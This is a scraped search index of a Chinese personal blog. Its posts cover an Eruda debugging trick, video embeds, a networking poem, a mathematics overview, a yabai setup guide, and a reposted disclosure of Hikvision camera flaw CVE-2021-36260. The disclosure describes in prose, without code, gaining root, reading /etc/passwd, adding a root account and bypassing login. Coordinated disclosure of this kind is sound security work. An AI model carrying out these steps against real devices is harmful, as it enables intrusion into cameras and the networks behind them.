然而，這在開發階段可以這樣做比較好，但是在線上環境可能要加URL引數比較麻煩。於是我想到了在頁面中點選某個元素10次再載入Eruda，點選10次或者更多次，然後在sessionStorage中寫入eruda=true，然後重新整理當前頁。相反，再點選10次關閉Eruda。用這樣比較隱藏的方式開啟或關閉Eruda，這樣線上環境也可以自由開啟或關閉Eruda了。 例子：假如有這樣的一個頁面，裡有一個標題文字 \u003ch2\u003e——規則詳情——\u003c/h2\u003e \u003cdiv\u003e ..... \u003c/div\u003e 那麼我們可以在h2標籤上繫結一個click事件，加入方法名叫showEruda \u003ch2 onclick=\"showEruda\"\u003e——規則詳情——\u003c/h2\u003e \u003cdiv\u003e ..... \u003c/div\u003e \u003cscript\u003e var count = 0; function showEruda () { if (count \u003e= 10) { var erdua = sessionStorage.getItem('erdua'); if (!erdua || erdua === 'false'){ sessionStorage.setItem('eruda', 'true') } else { sessionStorage.setItem('eruda', 'false') } location.reload() } count++ } \u003c/script\u003e 這樣點選規則詳情10次就可以喚起Eruda了，再點選10次就關閉Eruda，反正我覺得這樣挺好的。 不知道大家都是怎麼用的呢？ ","date":"2021-11-04","objectID":"/zh-cn/11-4/:5:0","tags":[],"title":"手机移动端调试工具","uri":"/zh-cn/11-4/"},{"categories":[],"content":"在线聊天 ","date":"2021-11-03","objectID":"/zh-cn/talk/:0:0","tags":[],"title":"在线聊天","uri":"/zh-cn/talk/"},{"categories":[],"content":"高能时刻 让网页跳起舞来 扫码加我来问我嘛😄 听会儿与我慢慢聊😄 ","date":"2021-11-03","objectID":"/zh-cn/mryang/:0:0","tags":[],"title":"Mr·Yang","uri":"/zh-cn/mryang/"},{"categories":[],"content":"音乐🎵影音🎬 .dplayer { position: relative; width: 100%; height: auto; margin: 3% auto; text-align: center; } function loadDPlayer(){ let dp = new DPlayer({ container: document.getElementById(\"highline\"), autoplay: \"true\", theme: \"#b7daff\", loop: \"true\", lang: \"zh-cn\", screenshot: true , hotkey: true , preload: \"none\", logo: \"\", volume: 0.7 , mutex: true , video: { url: \"https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/Video/1.mp4\", pic: \"\", thumbnails: \"\", type: \"auto\", }, subtitle: { url: \"\", type: \"webvtt\", fontSize: \"20px\", bottom: \"10%\", color: \"#b7daff\", }, }); } document.addEventListener('DOMContentLoaded', loadDPlayer, !1); ","date":"2021-11-03","objectID":"/zh-cn/music-moive/:0:0","tags":[],"title":"Music Moive","uri":"/zh-cn/music-moive/"},{"categories":[],"content":"无题 在与无数个数据包碰撞之后 我来到你身边 你默然转身 我伸手 你消失 我被欺骗了 那些带我到你身边的网关 我曾经那么不屑于你的存在 连你仅有的路由条目也差点删去 总以为 有了OSPF就可以放弃RIP 有了VPN就可以放弃DDN 有了拓扑图就可以放弃你... 你伤心欲绝 那么依依不舍的离开了我 还不忘留下你的MAC地址 当我明白一切的时候 疯狂的发送ARP广播 得来的却是目的主机不可达 一次又一次 目的主机不可达 ... 是谁封闭了你的端口 是谁隐藏了你的IP 是谁加密了你的隧道 是谁欺骗了我的ARP 为何你要封装你的信息 为何你要离开我的area0 为何你用ACL拒绝我的访问 为何我当初是那么自负 原谅我好吗 知道吗 你就是我的边界路由 没有你 我不知道我的下一跳去往何方 你就是我的ACL 没有你 我连拒绝的权限也没有 ... 你就是我的NAT 没有你 网络的寒流随时入侵我的体内 好冷 好冷 今天我再最后发送一次ARP 原谅我好吗 .dplayer { position: relative; width: 100%; height: auto; margin: 3% auto; text-align: center; } function loadDPlayer(){ let dp = new DPlayer({ container: document.getElementById(\"highline\"), autoplay: \"true\", theme: \"#b7daff\", loop: \"true\", lang: \"zh-cn\", screenshot: true , hotkey: true , preload: \"none\", logo: \"\", volume: 0.7 , mutex: true , video: { url: \"https://raw.githubusercontent.com/ybrc/ybrc.github.io/source/Video/%20%E6%8A%96%E9%9F%B3.mp4\", pic: \"\", thumbnails: \"\", type: \"auto\", }, subtitle: { url: \"\", type: \"webvtt\", fontSize: \"20px\", bottom: \"10%\", color: \"#b7daff\", }, }); } document.addEventListener('DOMContentLoaded', loadDPlayer, !1); ","date":"2021-11-03","objectID":"/zh-cn/2021-02/:0:0","tags":[],"title":"有趣","uri":"/zh-cn/2021-02/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260) Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260) Published on 18 Sep 2021 This article has been written for a technical audience. Vulnerability discovered 20 June 2021 ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:0:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Table of Contents: Summary Risk Assessment Vulnerability details Proof of Concept video on a real target A few stills from the real attack POC video Recommendations made to Hikvision Remediation Is this a Chinese Government mandated backdoor? Additional Thanks Affected Firmware Types Affected Model List Timeline ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:0:1","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Summary The majority of the recent camera product ranges of Hikvision cameras are susceptible to a critical remote unauthenticated code execution vulnerability even with latest firmware (as of 21 June 2021). Some older models are affected also as far back as at least 2016. Some NVRs are also affected, though this is less widespread. This is being tracked as CVE-2021-36260 Hikvision’s security advisory: security-notification-command-injection-vulnerability-in-some-hikvision-products This permits an attacker to gain full control of device with an unrestricted root shell, which is far more access than even the owner of the device has as they are restricted to a limited “protected shell” (psh) which filters input to a predefined set of limited, mostly informational commands. In addition to complete compromise of the IP camera, internal networks can then be accessed and attacked. This is the highest level of critical vulnerability – a zero click unauthenticated remote code execution (RCE) vulnerability affecting a high number of Hikvision cameras. Connected internal networks at risk Given the deployment of these cameras at sensitive sites potentially even critical infrastructure is at risk. A list of affected firmware types can be found at the end of this document. Firmware from as long ago as 2016 has been tested and found to be vulnerable. Only access to the http(s) server port (typically 80/443) is needed. No username or password needed nor any actions need to be initiated by camera owner. It will not be detectable by any logging on the camera itself. This vulnerability was reported to Hikvision the day after discovery, on 21 June 2021. I wrote a full report to them identifying the problem code, the device types affected, POC and recommendations for resolution. At the time of writing, patched firmware is partially available though inconsistently deployed across various Hikvision firmware portals. ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:1:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Risk Assessment Impact: Remotely Exploitable: Yes Authentication Required: None Zero click (no action needed from device owner): Yes Render device inoperable: Yes Read customer data: Yes Change customer data: Yes Latest firmware vulnerable: Yes (as of 21 June 2021) Latest products vulnerable: Yes Denial of Service vulnerability: Yes Potentially enable physical attack on site: Yes Attack internal network: Yes The is the most serious form of vulnerability for this device type. ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:2:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Vulnerability details Not for public release in order to protect companies/end users. ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:3:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Proof of Concept (POC) example Hikvision HSRC (Hikvision Security Response Center) requested POC of the vulnerability when I first reported it to them, and I replied with working code within 2 hours or so. As it’s not responsible to disclose a POC, I instead decided to make a video showing it in action, though I have subsequently agreed with Hikvision not to release it. Rather than just use my own equipment as a target, which could seem contrived, I enlisted the aid of a friend from the http://ipcamtalk.com forum, @alistairstevenson, who kindly put up a real live camera with permission to exploit. I wasn’t told the access credentials but during the attack it was clear it’s running 2021 firmware and camera was manufactured January 2021. The video showed a real world example of me attacking this target, obtaining information that should be only available to the owner, obtaining a root shell accessible via SSH (even though SSH disabled in the web interface), and ultimately bypassing the camera admin web portal authentication. ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:4:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"A few stills from the real target POC video I don’t know the root/admin password. We get device information we shouldn’t be able to get, the contents of /etc/passwd (the admin account password is always the same as the camera web portal admin password) and add our own system root account: That account is using the restricted informational shell Hikvision limits the camera owner to, so we add a root account with /bin/sh shell, login via SSH: Disable web authentication and login to target camera admin web pages with any password. In reality we already have a far more important root shell but I wanted to demonstrate web page login is trivial at this point: With a root shell, a real attacker could have easily taken a large range of hostile actions at this point. ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:5:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Recommendations made to Hikvision I made a number of recommendations in my report to HSRC. I identified the flawed code that was the problem, and indicated how I thought it best to remedy it. I don’t have access to their code base repositories, but rather needed to decrypt firmware, and reverse engineer code yet I still found it. Issue new firmware as soon as possible and issue a public security advisory. ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:6:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Remediation Received patched IPC_G3 (V5.5.800 build 210628) and IPC H5 (V5.5.800 build 210628) firmware from HSRC for testing. Decrypted and reversed the code in addition to live testing on my own equipment and confirmed to HSRC that the patched firmware resolves the vulnerability. Was further pleased to note this problem was fixed in the way I recommended. ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:7:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Is this a Chinese Government mandated backdoor? No, definitely NOT. You wouldn’t do it like this. And not all firmware types are affected. 28 September 2021 update: expanded answer provided here ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:8:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Additional I’m a security researcher who used to look after servers, networks and 1000s of people’s data in a former life, and the last few months knowing this exists on such a large scale has been worrying. Still I needed to wait 90 days after reporting before making any responsible public disclosure, whilst providing assistance to them and encouraging patched firmware to be developed, tested, published and a public security advisory issued. I’d recommend you do not expose any IoT device to the Internet no matter who it is made by - or in which country the device is made (including USA, Europe etc). Use a VPN for access if needed. Block outbound traffic too if at all possible - I also like to give these devices the wrong gateway (router) IP. You can find me at ipcamtalk.com, or watchfulip@protonmail.com Watchful IP ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:9:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Thanks Thank you to the members of ipcamtalk.com who agreed a security research testing scope with me and provided access to some camera types I didn’t own. In particular: @alistairstevenson @iTuneDVR @Securame @rawinek @cyrusbyte Thank you to Hikvision - particularly the Head of HSRC, his team and R\u0026D for working hard to fix this quickly. I sent them lots of emails and reports which they kindly liaised with me on. ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:10:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Affected Firmware Types Notes: I do not have the ability to decrypt all firmware types, nor access to all versions so am unable to check all firmware. Usually firmware types use the prefix IPC (IP Camera = not PTZ) or IPD (IP Dome = PTZ camera). Date code is in the form YYMMDD. OEM firmware is not listed - there’s too many to try to obtain and check. At time of writing updated firmware seems to be properly deployed on the Hikvision China region firmware portal for Chinese region devices, but only partially on the Global site. On the European www.hikvisioneurope.com and Russian [http://ftp.hikvision.ru](http://ftp.hikvision.ru/01. Firmware/) sites even much of the updated firmware from the incomplete Global site is missing. Other regional portals are also likely unreliable. Some NVRs are also affected, though they were not within the original scope of this report. Please refer to Hikvision’s advisory for more information. Vulnerable IP Camera Firmware Type Most recent vulnerable Firmware Version IPC_E0 IPC_E0_CN_STD_5.4.6_180112 IPC_E1 unknown IPC_E2 IPC_E2_EN_STD_5.5.52_180620 IPC_E4 unknown IPC_E6 IPCK_E6_EN_STD_5.5.100_200226 IPC_E7 IPCK_E7_EN_STD_5.5.120_200604 IPC_G3 IPC_G3_EN_STD_5.5.160_210416 IPC_G5 IPC_G5_EN_STD_5.5.113_210317 IPC_H1 IPC_H1_EN_STD_5.4.61_181204 IPC_H5 IPCP_H5_EN_STD_5.5.85_201120 IPC_H8 Factory installed firmware mid 2021 IPC_R2 IPC_R2_EN_STD_V5.4.81_180203 Some of these are from 2018, but they were the most up to date firmware available at time of report. Vulnerable PTZ Camera Firmware Type Most recent vulnerable Firmware Version IPD_E7 IPDEX_E7_EN_STD_5.6.30_210526 IPD_G3 IPDES_G3_EN_STD_5.5.42_210106 IPD_H5 IPD_H5_EN_STD_5.5.41_200911 IPD_H7 IPD_H7_EN_STD_5.5.40_200721 IPD_H8 IPD_H8_EN_STD_5.7.1_210619 Vulnerable Legacy Firmware Proven to be vulnerable - though newer firmware has existed for some time which doesn’t have the vulnerability. Type Vulnerable Firmware Version IPC_R7 Up to 5.4.x IPD_R7 Up to 5.4.x IPC_G0 Up to 5.4.x IPC_H3 Up to 5.4.x IPD_H3 Up to 5.4.x Perhaps others too - these are just ones I stumbled across and I wasn’t really looking for legacy issues. There’s lots of cameras with old vulnerable firmware accessible on the Internet according to shodan however. ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:11:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Affected Model List Coming up with a proper affected model list is hard: Chinese region variants have often have their own model names Some firmware does not have public release notes that list the compatible models There’s a huge number of OEM resellers with their own model numbers For this reason I think it better to simply include the list Hikvision have published in their security advisory: ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:12:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Timeline Vulnerability discovered: Sunday 20 June 2021 Manufacturer notified of issue: Monday 21 June 2021 16:16 to HSRC@hikvision.com and support.uk@hikvision.com. Unfortunately HSRC didn’t receive this due to it being caught by a spam filter. Wednesday 23 June 2021 01:00 Follow up email to HSRC@hikvision.com and 400@hikvision.com, additionally sent pdf copy of email via vulnerability submission form at https://www.hikvision.com/europe/support/cybersecurity/report-an-issue/ Wednesday 23 June 2021 04:27 received reply from HSRC@hikvision.com requesting report on my findings. Wednesday 23 June 2021 05:40 v1.0.0 of vulnerability details (WIP-2021-06-HIK-2) emailled to HSRC@hikvision.com Wednesday 23 June 2021 07:42 HSRC confirm they have reproduced the issue. Wednesday 07 July 2021 Request for disclosure timeline and CVE details in the next 7 days. Sunday 12 July 2021 HSRC inform me of the CVE ID they have applied for (CVE-2021-36260) Wednesday 04 August 2021 notify HSRC of my intention to make limited public disclosure 90 days after my initial report 20 September 2021. I insist companies/end-users know there is risk and they need to update devices. Tuesday 17 August 2021 HSRC send patched IPC_G3 (built 28 June 2021) and IPC_H5 (built 28 June 2021) for testing Wednesday 18 August 2021 informed HSRC testing on patched firmware complete – urge them to release firmware as soon as possible on all firmware portals. Saturday 18 September 2021 Hikvision and I publish our respective advisory/report ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:13:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"related posts ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:14:0","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["Camera","NVR","CVE","Hikvision"],"content":"Request for Comment response (CVE-2021-36260) ","date":"2021-11-01","objectID":"/zh-cn/2021-01/:14:1","tags":["Camera","NVR","CVE","Hikvision"],"title":"Unauthenticated Remote Code Execution (RCE) vulnerability in Hikvision IP camera/NVR firmware (CVE-2021-36260)","uri":"/zh-cn/2021-01/"},{"categories":["理科","数学","玩"],"content":"**数学深渊图解(概述和分解)(典藏版5k字) ** 数学深渊图解(概述和分解)(典藏版5k字) 形成共同人类认知、探寻自然或社会的规律，科学研究采用可观测、可测量、可证明的方法。这意味着，人类可以观察、测量某种现象或问题，然后用数学工具形式化描述为严格准确的知识，进而找到对具体自然、社会现象或问题的规律性解释或结论，做出实证或证伪。 数据相关的数学和科学、算法和程序、资源和简化、机构和活动、政策和新闻，请关注数据简化DataSimp社区！~ 如果有人不相信数学是简单的，那是因为他们没有意识到人生有多复杂。——冯·诺依曼. 人类对自然社会寻找规律的各种认知方法中，语言文字类描述最为宽泛、随意、不确定，技术类描述最为直接、实用，数学类描述最为准确、严格、确定。科学研究领域注重实验测量；非科学研究领域不采用严格数学形式化方法，除了语文工具和技术工具，数学工具也有其应用，此处不作解读( 详情请期待拙著《数据资源概述》和《数据简化技术》)。如果研究者不具备科学思维，则只能用语言文字表达为主的识字思考型思维泛泛而谈，用语文思想理论(这种理论并非科学理论)来思维、讨论，甚至写论文、教学。我国当前缺前者，后者泛滥。总之，数学工具在人类不同认知研究中，都有举足轻重的应用和作用。下面，我们从流行全球的数学的深渊组图来认识一下数学的魅力。 I. 数学深渊图解(概述) 数学深渊(Mathematics trench)来自美国休斯顿大学数学系网页 1-2。 数学深渊图解名词 group theory(群论)：一般叫它抽象代数，就是研究一种特殊的代数结构(群)以及它的性质，这个一般数学系本科生都能学到。 real analysis(实分析)：或者叫实变函数，研究测度，积分，算子等，是微积分的推广，一般数学系本科生也都能学到。 calculus of variations(变分法)：很遗憾这个我不太清楚，或者说忘了。 cryptography(密码学)：这个就顾名思义了。值得一提的是，密码学与数论的关系很紧密(比如说椭圆曲线加密etc) euclidean spaces(欧氏空间)：就是所谓的R^n，一般提到它时也指它上面的一般的度量(拓扑)，而不仅仅是集合本身。 stochastic calculus(随机微积分)：近来很火的领域，在金融和物理中均有应用。这方面我非常外行，还是留给大神补充了。说到随机积分，就想起了ito这个日本人。 game theory(博弈论)：这个大家或多或少都了解一些，在经济学中应用很广泛。 combinatorics(组合数学)：主要是和计数以及有限结构有关系的一个领域，现在理论和应用均很广泛，也和其他学科有广泛的联系。 complexanalysis/function(复分析/复变函数)：狭义的单变量复变函数研究复平面(以及它的子集上)的全纯和亚纯函数的性质。 holomorphic functions(全纯函数)：在定义域(复平面的子集)上点点解析的函数。注意解析既可以用柯西-黎曼条件定义，也可以用存在幂级数展开定义。 topology(拓扑学)：研究几何空间在满足特殊性质的连续变换(例如下面的同胚)下不变的性质(例如，长度不是一个拓扑性质，但“是否有洞”是)。 metric space(度量空间)：一个在分析中的概念。简单地可以理解成一个集合上有一个符合一定条件的度量，这样我们就是衡量两点间的距离了。 riemann surface(黎曼曲面)：一维复流形，具有很多良好的性质，可以把分析，代数拓扑和代数几何的工具都运用上去。 homeomorphism(同胚)：拓扑中的概念，指两个空间相互之间有一个互逆的连续映射，例如，你可以把橡皮泥捏成一个球或者正方体。 homotopy(同伦)：拓扑中的概念，指一个函数可以“连续”地变成另一个函数。参考下图。但homotopy theory作为拓扑学的一个分支，在二战后直到现在取得了非常长足的发展，早已突破了直觉上的同伦了。(笑) boolean algebra(布尔代数)：一个特殊的代数结构，以0，1取值，与电路设计和计算机逻辑紧密相关。 banach spaces/hilbertspaces(巴拿赫空间/希尔伯特空间)：满足特定条件的normed(这个中文应该怎么说？)/内积空间。都是实分析/泛函分析主要的研究对象。 Galois theory(伽罗瓦理论)：研究多项式方程的根与这些根的置换群之间的关系的学科。是现代(近代)代数数论的基础。 differential geometry(微分几何)：简单来说，我们想在更一般的曲面(流形)上做微积分的方法。黎曼几何是它的一门子领域，我国著名的数学家陈省身便是20世纪微分几何大师。 groupoids(群胚)：一个范畴学(category theory)中的概念。指每个态射均可逆的范畴。我想这个名字的意思是它(群胚)能产生群吧(笑)。 algebraic topology(代数拓扑)：一个简单(但很有野心)的问题是，我们想把所有空间分类，按照某种标准(比如上面说的，如果两个空间同胚，或者更宽松的映射)。我们关心两个空间是否同胚(或者其他的)。而代数拓扑提供了这样一些代数工具。简单来说，如果空间A,B不同胚，那么他们的某个代数量不同。例如前文所说的“洞”的个数。 p-adic analysis(p进制分析)：诞生于20世纪的学科，来源于数论的需求。简单的说，所有p进制数放在一起构成一个空间，我们想研究这个空间的性质，在这个空间上做“微积分”。但这个空间的性质与我们对欧氏，甚至一般的微分流形的直觉差异巨大。这是个相当有趣如今也相当活跃的学科。 smooth manifold(光滑流形)：微分几何的主要研究对象，意为可以给它一个“光滑结构”的流形。这个流形不光要局部看起来像欧几里得空间，它的“坐标”还要满足一些“光滑性”条件。 hairy ball theorem(毛球定理)：就是说：你永远捋不顺一个球上的毛。在数学上说，球面没有一个不为0的向量场。这个定理来源于微分几何，但也可以用代数拓扑的工具去证明。 algebraic geometry(代数几何)：我们希望解多项式方程，或者至少知道它的解的一些性质(代数)。而多项式方程不光是一个方程，它也能代表几何图形(几何)。这些在代数几何这门学科里得到了统一。这是20世纪乃至到现在相当火热的方向，也非常深刻和有趣。 projective variety(射影簇)：代数几何中的研究对象。射影簇由于其良好的性质(“紧”性)，成为主要研究的对象。而一般的仿射簇，我们也可以将它射影化。类似于将平面加一点就变成了球面。 grobner basis(grobner基)：一个交换代数中的概念。 algebraic number theory(代数数论)：大概可以意为研究解多项式方程的学科。在伽罗瓦理论提出后发展迅猛，在格罗滕迪克提出现代代数几何的概念后，代数数论又得到了进一步的革新。直至今天，代数数论是数学里最古老，也是发展的最快的学科之一。 automorphic forms(自守形式)：模形式的推广，代数数论中的基本工具。意为某个在上半复平面(以及无穷远点)上亚纯，并关于某个离散群作用下不变的函数。 lie algebras(李代数)：在一个向量空间上定义一个“方框”，使得它满足特定性质。lie algebra在表示论，数学物理，代数几何和代数群中应用广泛。 数学深渊图解问答 遇到一张趣图，如果想学数学，恭喜你来到深渊。其行也远，其路也艰，虽千万里，吾往矣。 无知问题Q1：如何才能学好数学? 无畏回答A1：Hilbert:五次，Hermann,最少五次.这是希尔伯特说的,对象是Weyl, 他认为一个数学家在教授一门课的时候要多次重复.学好一门数学课程多次重复是必要的. 无知问题Q2：数学系研究生不考虑研究方向，只想学习掌握知识，那这些理论可以学完吗？或者可以自学到哪个程度？ 无畏回答A2：自学完全可以，但不可能“学完”，只能对其中大多数领域有粗浅的了解(像我这样)。如果要做研究就必须要选定一两个具体方向，但有意思的是不同的领域的知识往往都是交汇的。 好了，在“天才少年你好”前面不用翻维基百科，我能写出来的应该就是这些了。当然这张图自然是极不合理。例如很上面的组合数学其实是研究中很热点的方向，而下面的上同调只是代数拓扑中的一个工具。欢迎大家补充and提问。 无知问题Q3：哥们有什么建议指导自学吗？我今年29岁了，学历大专，数学初中还可以，高中一塌糊涂基本没有及格过。但我对数学一直不甘心？？大专毕业后自学了高数、线代、概率论，就是看了下课本了解下会做简单题的水平。现在我还是不甘心，恰巧空闲时间也多，想继续自学数学，所以哥们有什么指导建议吗？(我真不甘心数学一般般，想把数学大都掌握了，而且掌握的很好！100分可以85分以上那种的好) 无畏回答A3：可以尝试先学学复变函数、实变函数和抽象代数找找感觉，这些是之后那些的基础…不过还是不要想着把数学\"学完\"…慢慢来。部分非科学研究方法的各领域博士亦需要学习。 II. 数学深渊图解(分解) 遇到一张妙图,号称“数学的深渊”。 若非数理精通者，如看天书。 匆匆一暼，尽皆术语，让人汗流浃背。 数学之涩，易理之难。 其行也远, 其路也艰, 虽千万里, 吾往矣。 原图内容略显单薄，历史脉络亦不分明。 量子学派将其扩展整理，集纳更多理科知识。 前后千年，共分八章。 这是一部数学史，也是一部天才简史。 从万物皆数到变量数学； 从欧氏几何到黎曼空间； …… 毕达哥拉斯、欧几里得、阿基米德、笛卡尔、费马、牛","date":"2021-11-01","objectID":"/zh-cn/2021-11-03/:0:0","tags":["理科","数学","玩"],"title":"数学深渊图解(概述和分解)(典藏版5k字) ","uri":"/zh-cn/2021-11-03/"},{"categories":["Yabai"],"content":"平铺式窗口管理器-yabai 平铺式窗口管理器-yabai ","date":"2021-10-31","objectID":"/zh-cn/31-1/:0:0","tags":["Yabai"],"title":"平铺式窗口管理器-yabai","uri":"/zh-cn/31-1/"},{"categories":["Yabai"],"content":"1. 什么是平铺式窗口管理器(Tiling window manager) 首先它是一个窗口管理器，可以快速选中需要操作的窗口，平铺窗口的特点就是不会相互重叠覆盖， 看两个图就能明白: 下面这个是普通的mac窗口布局 下面这个是经过 yabai管理后的窗口布局 平铺式窗口管理器允许窗口分组、 窗口分割、快速切换、调整窗口大小、切换焦点位置等等。 可以去这里看下i3wm的介绍，你会有更加直观的印象。 (i3wm是一款很出名的平铺式窗口管理器,可惜mac用不了) ","date":"2021-10-31","objectID":"/zh-cn/31-1/:1:0","tags":["Yabai"],"title":"平铺式窗口管理器-yabai","uri":"/zh-cn/31-1/"},{"categories":["Yabai"],"content":"2. yabai是什么 mac用不了i3wm，只能去找下替代品，找了半天，找到了 yabai， 名字是挺奇怪的，用起来感觉还不错。 yabai是在 chunkwm的基础上重写的，而 chunkwm是在 kwm的基础上重写的… 不知道以后会不会有yabai2… ","date":"2021-10-31","objectID":"/zh-cn/31-1/:2:0","tags":["Yabai"],"title":"平铺式窗口管理器-yabai","uri":"/zh-cn/31-1/"},{"categories":["Yabai"],"content":"3. 安装yabai 关闭SIP(系统完整性保护) 具体参考这里: https://www.jianshu.com/p/fe78d2036192 安装homebrew 大部分mac应该都装了，没装的参考官网步骤即可: https://brew.sh/ 安装yabai brew install yabai sudo yabai --install-sa 安装快捷键支持: brew install koekeishiya/formulae/skhd 拷贝默认配置: curl https://raw.githubusercontent.com/koekeishiya/yabai/master/examples/yabairc --output ~/.yabairc curl https://raw.githubusercontent.com/koekeishiya/yabai/master/examples/skhdrc --output ~/.skhdrc 配置字体 需要本机安装下 https://fontawesome.com/v4.7.0/, 直接下载压缩包解压点击字体文件即可，后续的定制化需要用到这些字体图标 启动服务 brew services start skhd brew services start yabai 第一次启动会请求授权, 请求授权后restart即可 brew services restart skhd brew services restart yabai 启动后会发现窗口不太好控制了(不能浮动)， 使用快捷键 ctrl+alt+d就能切回普通的浮动模式，ctrl+alt+a可以切回你需要熟悉的平铺模式。 全部安装完成后,最好重启下电脑。 ","date":"2021-10-31","objectID":"/zh-cn/31-1/:3:0","tags":["Yabai"],"title":"平铺式窗口管理器-yabai","uri":"/zh-cn/31-1/"},{"categories":["Yabai"],"content":"4. 自定义配置 这里贴一下我的配置, 里面包含了一些中文注释 vim ~/.skhdrc # open terminal # cmd - return : /Applications/iTerm2.app # focus window(同一个空间切换窗口焦点) alt - h : yabai -m window --focus west alt - j : yabai -m window --focus south alt - k : yabai -m window --focus north alt - l : yabai -m window --focus east # swap window(同一个空间调整窗口位置) shift + alt - h : yabai -m window --swap west shift + alt - j : yabai -m window --swap south shift + alt - k : yabai -m window --swap north shift + alt - l : yabai -m window --swap east # move window # shift + cmd - h : yabai -m window --warp west # shift + cmd - j : yabai -m window --warp south # shift + cmd - k : yabai -m window --warp north # shift + cmd - l : yabai -m window --warp east # balance size of windows shift + alt - 0 : yabai -m space --balance # make floating window fill screen # shift + alt - up : yabai -m window --grid 1:1:0:0:1:1 # make floating window fill left-half of screen # shift + alt - left : yabai -m window --grid 1:2:0:0:1:1 # make floating window fill right-half of screen # shift + alt - right : yabai -m window --grid 1:2:1:0:1:1 # create desktop, move window and follow focus - uses jq for parsing json (brew install jq) shift + cmd - n : yabai -m space --create \u0026\u0026 \\ index=\"$(yabai -m query --spaces --display | jq 'map(select(.\"native-fullscreen\" == 0))[-1].index')\" \u0026\u0026 \\ yabai -m window --space \"${index}\" \u0026\u0026 \\ yabai -m space --focus \"${index}\" # create desktop and follow focus - uses jq for parsing json (brew install jq) cmd + alt - n : yabai -m space --create 